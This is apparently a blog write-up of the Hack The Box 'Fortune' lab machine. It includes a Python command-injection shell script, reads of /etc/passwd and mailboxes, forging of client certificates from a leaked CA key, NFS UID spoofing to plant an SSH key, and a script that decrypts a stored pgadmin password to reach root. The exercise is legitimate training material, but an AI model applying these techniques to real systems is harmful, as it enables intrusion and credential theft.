---
layout: single
title: Fortune - Hack The Box
excerpt: "In this box, I use a simple command injection on the web fortune application that allows me to find the Intermediate CA certificate and its private key. After importing the certificates in Firefox, I can authenticate to the HTTPS page and access a privileged page that generates an SSH private key. Next is SSH port forwarding to access an NFS share, upload my SSH public key to escalate to another user, then recover a pgadmin database which contains the DBA password which is also the root password. Cool box overall, but it should have been rated Hard instead of Insane."
date: 2019-08-03
classes: wide
header:
  teaser: /assets/images/htb-writeup-fortune/fortune_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - python
  - flask
  - command injection
  - certificate
  - nfs
  - port forward
  - ssh
  - postgresql
  - sqlite
  - pgadmin
  - openssl
---

![](/assets/images/htb-writeup-fortune/fortune_logo.png)

In this box, I use a simple command injection on the web fortune application that allows me to find the Intermediate CA certificate and its private key. After importing the certificates in Firefox, I can authenticate to the HTTPS page and access a privileged page that generates an SSH private key. Next is SSH port forwarding to access an NFS share, upload my SSH public key to escalate to another user, then recover a pgadmin database which contains the DBA password which is also the root password. Cool box overall, but it should have been rated Hard instead of Insane.

## Summary

- There's a command injection found in the `db` parameter of the web fortune application
- The intermediate CA private key is found in a directory that I can access through the command injection
- I can generate a client certificate that I will use to access the ssh authentication web page
- After generating an SSH private keym, I can establish an SSH session as user `nfsuser`
- By port-forwarding port 2049 I can mount the `/home` directory of the NFS server
- With NFS I write my SSH public key into the `charlie` user directory and gain SSH access there
- The pgadmin application database is exposed and I can recover the dba account password since I have the encrypted value and the decryption key
- Based on a note found when I first got access, I know the dba password is the same as the root account and I can `su` to gain root access

## Detailed steps

### Nmap

This box runs SSH and the OpenBSD httpd web server with both HTTP and HTTPS ports open.

```
# nmap -sC -sV -p- -oA fortune fortune.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-09 19:01 EST
Nmap scan report for fortune.htb (10.10.10.127)
Host is up (0.012s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
```

### Command injection on the fortune web app

The website shows a list of databases that I can select, then it runs the `fortune` application to return random quotes.

From the man page:
>fortune — print a random, hopefully interesting, adage

![](/assets/images/htb-writeup-fortune/fortune1.png)

![](/assets/images/htb-writeup-fortune/fortune2.png)

The fortune web app has a pretty trivial command injection vulnerability. It simply appends what I pass in the `db` parameter to the `fortune` application call. I can run arbitrary commands and programs simply by adding a semi-colon after the database name.

The example here shows I can run `id` and list the root directory:

![](/assets/images/htb-writeup-fortune/fortune3.png)

Because I wasn't sure how much time I'd need to spend poking around the system through that command injection vulnerability, I wrote a quick python script that runs commands and cleans up the output. The output of all commands is displayed to screen and also saved to `output.txt`.

```python
#!/usr/bin/python

import re
import readline
import requests

f = open("output.txt", "a")

while True:
    cmd = raw_input("> ")
    data = { "db": ";echo '****';{}".format(cmd)}
    r = requests.post("http://fortune.htb/select", data=data)
    m = re.search("\*\*\*\*(.*)</pre>", r.text, re.DOTALL)
    if m:
        print m.group(1)
        f.write("CMD: {}".format(cmd))
        f.write(m.group(1))
```

Here's what the output looks like:

```
> ls -l

total 56
drwxrwxrwx  2 _fortune  _fortune    512 Nov  2 23:39 __pycache__
-rw-r--r--  1 root      _fortune    341 Nov  2 22:58 fortuned.ini
-rw-r-----  1 _fortune  _fortune  14581 Mar  9 19:03 fortuned.log
-rw-rw-rw-  1 _fortune  _fortune      6 Mar  9 18:38 fortuned.pid
-rw-r--r--  1 root      _fortune    413 Nov  2 22:59 fortuned.py
drwxr-xr-x  2 root      _fortune    512 Nov  2 22:57 templates
-rw-r--r--  1 root      _fortune     67 Nov  2 22:59 wsgi.py

> tail -n 10 /etc/passwd

_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin
_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin
_postgresql:*:503:503:PostgreSQL Manager:/var/postgresql:/bin/sh
_pgadmin4:*:511:511::/usr/local/pgadmin4:/usr/local/bin/bash
_fortune:*:512:512::/var/appsrv/fortune:/sbin/nologin
_sshauth:*:513:513::/var/appsrv/sshauth:/sbin/nologin
nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin
charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
bob:*:1001:1001::/home/bob:/bin/ksh
nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf
```

The user `_fortune` has `/sbin/nologin` for his shell so I can't just upload my SSH keys to get a real shell through SSH.

### Looking around the box as user _fortune

The previous box by AuxSarge had some special SSH configuration that made use of a local database to check the public keys of users. The first thing I did on this box was check the SSH configuration to see if there was something similar:

`/etc/ssh/sshd_config` has a special configuration for user `nfuser` that looks up the public key in a postgresql database instead of `.ssh`

```
Match User nfsuser
	AuthorizedKeysFile none
	AuthorizedKeysCommand /usr/local/bin/psql -Aqt -c "SELECT key from authorized_keys where uid = '%u';" authpf appsrv
	AuthorizedKeysCommandUser _sshauth
```

I spotted another web app in `/var/appsrv/sshauth` I didn't find in my initial enumeration. It's written in Python and running the Flask framework.

```
> ls -l /var/appsrv

total 12
drwxr-xr-x  4 _fortune   _fortune  512 Feb  3 05:08 fortune
drwxr-x---  4 _pgadmin4  wheel     512 Nov  3 10:58 pgadmin4
drwxr-xr-x  4 _sshauth   _sshauth  512 Feb  3 05:08 sshauth

> ls -l /var/appsrv/sshauth

total 52
drwxrwxrwx  2 _sshauth  _sshauth    512 Nov  2 23:39 __pycache__
-rw-r--r--  1 _sshauth  _sshauth    341 Nov  2 23:10 sshauthd.ini
-rw-r-----  1 _sshauth  _sshauth  13371 Mar  9 18:39 sshauthd.log
-rw-rw-rw-  1 _sshauth  _sshauth      6 Mar  9 18:38 sshauthd.pid
-rw-r--r--  1 _sshauth  _sshauth   1799 Nov  2 23:12 sshauthd.py
drwxr-xr-x  2 _sshauth  _sshauth    512 Nov  2 23:08 templates
-rw-r--r--  1 _sshauth  _sshauth     67 Nov  2 23:06 wsgi.py
```

I can see with `ps` that the application is running through `uwsgi`:

```
> ps waux | grep sshauth

_sshauth 39927  0.0  2.5 19164 26268 ??  S      6:38PM    0:00.41 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log
_sshauth  4866  0.0  0.5 19164  5588 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log
_sshauth 13512  0.0  0.5 19168  5564 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log
_sshauth 18294  0.0  0.5 19168  5564 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log
```

The web app has a route for `/generate` which calls a function that generates a new SSH keypair and displays it to the user.

```python
@app.route('/generate', methods=['GET'])
def sshauthd():

  # SSH key generation code courtesy of:
  # https://msftstack.wordpress.com/2016/10/15/generating-rsa-keys-with-python-3/
  #
  from cryptography.hazmat.primitives import serialization
  from cryptography.hazmat.primitives.asymmetric import rsa
  from cryptography.hazmat.backends import default_backend

  # generate private/public key pair
  key = rsa.generate_private_key(backend=default_backend(), public_exponent=65537, \
    key_size=2048)

  # get public key in OpenSSH format
  public_key = key.public_key().public_bytes(serialization.Encoding.OpenSSH, \
    serialization.PublicFormat.OpenSSH)

  # get private key in PEM container format
  pem = key.private_bytes(encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption())

  # decode to printable strings
  private_key_str = pem.decode('utf-8')
  public_key_str = public_key.decode('utf-8')

  db_response = db_write(public_key_str)

  if db_response == False:
    return render_template('error.html')
  else:
    return render_template('display.html', private_key=private_key_str, public_key=public_key_str)
```

Looking at the `httpd.conf` configuration file, I see that the `/generate` route is accessible only on the HTTPS port. However I can't access the HTTPS port because the server is configured for client certificate authentication.

![](/assets/images/htb-writeup-fortune/ssl_fail.png)

```
> cat /etc/httpd.conf

server "fortune.htb" {
        listen on * port 80

        location "/" {
                root "/htdocs/fortune"
        }

        location "/select" {
                fastcgi socket "/run/fortune/fortuned.socket"
        }
}

server "fortune.htb" {
        listen on * tls port 443
        tls client ca "/etc/ssl/ca-chain.crt"
        location "/" {
                root "/htdocs/sshauth"
        }
        location "/generate" {
                fastcgi socket "/run/sshauth/sshauthd.socket"
        }
}
```

I keep looking and find a boatload of certificates in bob's home directory:

```
> ls -lR /home/bob

total 8
drwxr-xr-x  7 bob  bob  512 Oct 29 20:57 ca
drwxr-xr-x  2 bob  bob  512 Nov  2 22:40 dba

/home/bob/ca:
total 48
drwxr-xr-x  2 bob  bob   512 Oct 29 20:44 certs
drwxr-xr-x  2 bob  bob   512 Oct 29 20:37 crl
-rw-r--r--  1 bob  bob   115 Oct 29 20:56 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29 20:56 index.txt.attr
-rw-r--r--  1 bob  bob     0 Oct 29 20:37 index.txt.old
drwxr-xr-x  7 bob  bob   512 Nov  3 15:37 intermediate
drwxr-xr-x  2 bob  bob   512 Oct 29 20:56 newcerts
-rw-r--r--  1 bob  bob  4200 Oct 29 20:55 openssl.cnf
drwx------  2 bob  bob   512 Oct 29 20:41 private
-rw-r--r--  1 bob  bob     5 Oct 29 20:56 serial
-rw-r--r--  1 bob  bob     5 Oct 29 20:37 serial.old

/home/bob/ca/certs:
total 8
-r--r--r--  1 bob  bob  2053 Oct 29 20:44 ca.cert.pem

/home/bob/ca/crl:

/home/bob/ca/intermediate:
total 52
drwxr-xr-x  2 bob  bob   512 Nov  3 15:40 certs
drwxr-xr-x  2 bob  bob   512 Oct 29 20:46 crl
-rw-r--r--  1 bob  bob     5 Oct 29 20:47 crlnumber
drwxr-xr-x  2 bob  bob   512 Oct 29 21:13 csr
-rw-r--r--  1 bob  bob   107 Oct 29 21:13 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29 21:13 index.txt.attr
drwxr-xr-x  2 bob  bob   512 Oct 29 21:13 newcerts
-rw-r--r--  1 bob  bob  4328 Oct 29 20:56 openssl.cnf
drwxr-xr-x  2 bob  bob   512 Oct 29 21:13 private
-rw-r--r--  1 bob  bob     5 Oct 29 21:13 serial
-rw-r--r--  1 bob  bob     5 Oct 29 21:13 serial.old

/home/bob/ca/intermediate/certs:
total 24
-r--r--r--  1 bob  bob  4114 Oct 29 20:58 ca-chain.cert.pem
-r--r--r--  1 bob  bob  1996 Oct 29 21:13 fortune.htb.cert.pem
-r--r--r--  1 bob  bob  2061 Oct 29 20:56 intermediate.cert.pem

/home/bob/ca/intermediate/crl:

/home/bob/ca/intermediate/csr:
total 8
-rw-r--r--  1 bob  bob  1013 Oct 29 21:12 fortune.htb.csr.pem
-rw-r--r--  1 bob  bob  1716 Oct 29 20:53 intermediate.csr.pem

/home/bob/ca/intermediate/newcerts:
total 4
-rw-r--r--  1 bob  bob  1996 Oct 29 21:13 1000.pem

/home/bob/ca/intermediate/private:
total 12
-r--------  1 bob  bob  1675 Oct 29 21:10 fortune.htb.key.pem
-rw-r--r--  1 bob  bob  3243 Oct 29 20:48 intermediate.key.pem

/home/bob/ca/newcerts:
total 8
-rw-r--r--  1 bob  bob  2061 Oct 29 20:56 1000.pem

/home/bob/ca/private:

/home/bob/dba:
total 4
-rw-r--r--  1 bob  bob  195 Nov  2 22:40 authpf.sql
```

I compare the CA cert used by the `httpd` service with the certs found in the folder and I find a match for the intermediate CA cert.

```
> md5 /etc/ssl/ca-chain.crt
MD5 (/etc/ssl/ca-chain.crt) = b5217e28843aace50f46951bc136632e

> md5 /home/bob/ca/intermediate/certs/ca-chain.cert.pem
MD5 (/home/bob/ca/intermediate/certs/ca-chain.cert.pem) = b5217e28843aace50f46951bc136632e
```

The intermediate CA cert `/home/bob/ca/intermediate/certs/intermediate.cert.pem` and its private key `/home/bob/ca/intermediate/private/intermediate.key.pem` are both readable by my user.

I download both Intermediate CA files and the CA cert on my machine then I combined the Intermediate CA cert and its private key into a PKCS12 package:

```
openssl pkcs12 -export -inkey intermediate.key.pem -in intermediate.cert.pem -out snowscan.p12
```

I'll import both the Intermediate and CA certs into my Firefox trusted autorities store:

![](/assets/images/htb-writeup-fortune/https1.png)

![](/assets/images/htb-writeup-fortune/https2.png)

Next, I import the PKCS12 file into my personal certificate storage:

![](/assets/images/htb-writeup-fortune/https3.png)

I'm prompted to chose a cert when connecting to the webpage

![](/assets/images/htb-writeup-fortune/https4.png)

I'm now able to access the HTTPS page:

![](/assets/images/htb-writeup-fortune/https5.png)

### Generating a new SSH key for user nfsuser

When I go to `https://fortune.htb/generate`, a new SSH keypair is generated and the private key is displayed:

![](/assets/images/htb-writeup-fortune/privatekey.png)

I can grab this key and use it to SSH as user `nfsuser`
```
# vi fortune.key
# chmod 400 fortune.key
# ssh -i fortune.key nfsuser@10.10.10.127

Hello nfsuser. You are authenticated from host "10.10.14.23"
```

I don't get a prompt however. Looking at the `/etc/passwd` file, I see that this user doesn't have a shell associated with him:

`nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf`

Because the user is named `nfsuser`, it's safe to assume there is something exported by NFS. I can see this in the `/etc/exports` file:

```
> cat /etc/exports

/home
```

The NFS port 2049 is firewalled but I can still access it by using local port forwarding in SSH.

```
# ssh -i fortune.key -L 2049:fortune.htb:2049 nfsuser@fortune.htb
Last login: Sat Mar  9 20:08:55 2019 from 10.10.14.23

Hello nfsuser. You are authenticated from host "10.10.14.23"
```

```
# mount -t nfs fortune.htb:/home /mnt
# ls -l /mnt
total 6
drwxr-xr-x 5 revssh   revssh   512 Nov  3 16:29 bob
drwxr-x--- 3 test1324 test1324 512 Nov  5 22:02 charlie
drwxr-xr-x 2     1002     1002 512 Nov  2 22:39 nfsuser
```

The `charlie` user directory is mapped to user ID 1000. I already has a user ID 1000 created on my Kali Linux box with the name `test1324`:

```
# grep test1324 /etc/passwd
test1324:x:1000:1000::/home/test1324:/bin/bash
```

To access `charlie`, I simply change to user `test1324` then I'm to access the files and the user flag.

```
root@ragingunicorn:~/htb/fortune# su test1324
test1324@ragingunicorn:/root/htb/fortune$ cd /mnt/charlie
test1324@ragingunicorn:/mnt/charlie$ ls
mbox  user.txt
test1324@ragingunicorn:/mnt/charlie$ cat user.txt
ada0af...
```

There's a mailbox file with a hint that we should look or the dba password next so we can log in as root:

```
test1324@ragingunicorn:/mnt/charlie$ cat mbox
From bob@fortune.htb Sat Nov  3 11:18:51 2018
Return-Path: <bob@fortune.htb>
Delivered-To: charlie@fortune.htb
Received: from localhost (fortune.htb [local])
	by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
	for <charlie@fortune.htb>;
	Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
From:  <bob@fortune.htb>
Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
To: charlie@fortune.htb
Subject: pgadmin4
Message-ID: <196699abe1fed384@fortune.htb>
Status: RO

Hi Charlie,

Thanks for setting-up pgadmin4 for me. Seems to work great so far.
BTW: I set the dba password to the same as root. I hope you don't mind.

Cheers,

Bob
```

To get a proper shell, I added my SSH key to `authorized_keys`:

```
test1324@ragingunicorn:/mnt/charlie$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA[...]pgYyFnLt3ysDhscPOtelvd root@ragingunicorn" >> .ssh/authorized_keys
```

Now I can log in as `charlie`

```
root@ragingunicorn:~# ssh charlie@fortune.htb
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$
```

In `/var/appsrv/pgadmin4`, I find the database for the `pgadmin` application: `pgadmin4.db`

It's a sqlite database and I already have tools to view this:

```
fortune$ file pgadmin4.db
pgadmin4.db: SQLite 3.x database
```

I find the user authentication table as well as the server table that contains the encrypted `dba` account password:

```
fortune$ sqlite3 pgadmin4.db
SQLite version 3.24.0 2018-06-04 19:24:41
Enter ".help" for usage hints.
sqlite> .tables
alembic_version              roles_users
debugger_function_arguments  server
keys                         servergroup
module_preference            setting
preference_category          user
preferences                  user_preferences
process                      version
role
sqlite> select * from user;
1|charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ|1|
2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg|1|

sqlite> select * from server;
1|2|2|fortune|localhost|5432|postgres|dba|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz||prefer||||||<STORAGE_DIR>/.postgresql/postgresql.crt|<STORAGE_DIR>/.postgresql/postgresql.key|||0||||0||22||0||0|
```

I checked the pgadmin source code on github to understand how it decrypts the `dba` password and saw that the `decrypt()` function takes two arguments. Since I already have the two values from the database I'll just copy/paste the code into a new script and punch in the values for bob's user at the end.

```python
# cat root.py
import base64
import hashlib
import os

import six

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher
from cryptography.hazmat.primitives.ciphers.algorithms import AES
from cryptography.hazmat.primitives.ciphers.modes import CFB8

padding_string = b'}'
iv_size = AES.block_size // 8

def pad(key):
    """Add padding to the key."""

    if isinstance(key, six.text_type):
        key = key.encode()

    # Key must be maximum 32 bytes long, so take first 32 bytes
    key = key[:32]

    # If key size is 16, 24 or 32 bytes then padding is not required
    if len(key) in (16, 24, 32):
        return key

    # Add padding to make key 32 bytes long
    return key.ljust(32, padding_string)

def decrypt(ciphertext, key):
    """
    Decrypt the AES encrypted string.
    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """

    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:iv_size]

    cipher = Cipher(AES(pad(key)), CFB8(iv), default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext[iv_size:]) + decryptor.finalize()

res = decrypt("utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz",  "$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg")
print(res.decode('ascii'))
```

Decryption works and I get the `dba` password:
```
root@ragingunicorn:~/htb/fortune# python root.py
R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
```

Based on the hint I found earlier, I know the `root` password is the same one used for `dba`:
```
fortune$ su
Password:

fortune# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
fortune# cat /root/root.txt
335af7...
```
